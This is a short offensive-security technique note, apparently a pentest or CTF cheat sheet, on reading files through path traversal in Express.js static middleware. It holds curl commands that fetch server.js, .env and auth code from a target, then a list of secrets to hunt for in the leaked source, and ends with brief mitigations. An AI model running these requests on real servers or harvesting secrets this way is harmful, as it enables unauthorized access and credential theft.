# Express Static Path Traversal

## Technique

When an Express.js app uses `express.static(__dirname, { index: false })`, files can be read via path traversal using `GET /../filename`.

## How It Works

The `express.static` middleware serves files relative to the directory specified. When `__dirname` is used (the directory of the main module), requesting `GET /../filename` resolves to `__dirname/../filename`, which is the parent directory.

## Discovery

Look for this pattern in `server.js`:
```javascript
app.use(express.static(__dirname, { index: false }));
// or
app.use(express.static(path.join(__dirname, 'public')));
```

## exploitation

```bash
# Try common files
curl -s "http://target/../server.js"
curl -s "http://target/../package.json"
curl -s "http://target/../middleware/auth.js"
curl -s "http://target/../models/User.js"
curl -s "http://target/../.env"
curl -s "http://target/../config.js"
```

## Verification

**Critical**: Verify the response is actual file content, not an error page:
- Check byte size (real source files are typically > 500 bytes)
- Check content doesn't contain "Cannot GET", "DOCTYPE html", or redirect markers
- Error pages are typically ~100-200 bytes with similar sizes

## What to Look For in Leaked Source

1. **JWT secrets**: `JWT_SECRET`, `secret`, `signToken()`
2. **Hardcoded passwords**: `seedAdmin()`, `create({password:`
3. **Database connection strings**: `mongodb://`, `MONGO_URI`
4. **API keys and tokens**
5. **Auth middleware bypass conditions**
6. **Unauthenticated route handlers**

## Mitigation

- Don't use `express.static(__dirname)` — use a dedicated public directory
- Add authentication middleware before static file serving
- Validate and sanitize paths to prevent traversal
